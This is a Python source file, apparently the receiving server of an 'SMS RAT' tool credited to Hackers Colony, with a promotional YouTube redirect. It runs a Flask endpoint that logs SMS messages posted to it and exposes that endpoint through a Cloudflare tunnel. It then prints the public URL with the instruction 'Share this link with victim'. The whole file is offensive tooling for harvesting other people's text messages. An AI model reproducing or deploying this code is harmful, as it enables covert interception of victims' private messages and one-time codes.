import os
import time
import re
from flask import Flask, request

# ─────────────────────────────────────────────
# HCO - SMS - RAT | By Hackers Colony
# ─────────────────────────────────────────────

app = Flask(__name__)

@app.route('/sms', methods=['POST'])
def receive_sms():
    sms_data = request.form.to_dict()
    print("\n\033[92m[✓] New SMS Received:\033[0m")
    for key, value in sms_data.items():
        print(f"\033[96m{key}:\033[0m {value}")
    return 'SMS received successfully', 200

def youtube_redirect():
    print("\n\033[91mThis tool is not free.\033[0m")
    print("\033[92mSubscribe to our YouTube channel first...\033[0m")
    time.sleep(2)
    print("\n\033[93mRedirecting to YouTube in 8 seconds...\033[0m")
    time.sleep(8)
    os.system("termux-open-url https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    time.sleep(2)

def start_server():
    print("\n\033[96m[•] Installing requirements...\033[0m")
    os.system("pip install flask > /dev/null 2>&1")

    print("\033[96m[•] Starting Flask server...\033[0m")
    os.system("nohup flask run --host=0.0.0.0 --port=4040 &")

    print("\033[96m[•] Starting Cloudflare tunnel...\033[0m")
    os.system("nohup cloudflared tunnel --url http://localhost:4040 > tunnel.log 2>&1 &")
    time.sleep(6)

    # Read the public URL from tunnel.log
    try:
        with open("tunnel.log", "r") as log_file:
            log_data = log_file.read()
            urls = re.findall(r"https://[-a-z0-9]+\.trycloudflare\.com", log_data)
            if urls:
                print(f"\n\033[92m[✓] Server & Tunnel running.\033[0m")
                print(f"\033[92m[✓] Share this link with victim:\033[0m \033[1;91m{urls[0]}/sms\033[0m\n")
            else:
                print("\033[91m[!] Tunnel URL not found in log. Try restarting cloudflared.\033[0m")
    except FileNotFoundError:
        print("\033[91m[!] tunnel.log not found. Cloudflared might not have started properly.\033[0m")

if __name__ == "__main__":
    os.system("clear")
    print("╔════════════════════════════════╗")
    print("║        HCO - SMS - RAT         ║")
    print("╚════════════════════════════════╝")
    youtube_redirect()
    start_server()
